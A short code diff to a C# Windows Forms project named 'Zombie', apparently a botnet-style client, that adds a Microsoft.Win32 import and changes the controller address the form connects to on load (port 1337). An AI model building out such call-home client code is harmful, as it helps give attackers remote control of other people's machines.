@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -27,7 +28,8 @@ namespace Zombie
 
         private void ZombieForm_Load(object sender, EventArgs e)
         {
-            Client.Start("192.168.0.144", 1337);
+            Client.Start("192.168.0.14", 1337);
+
         }
 
 
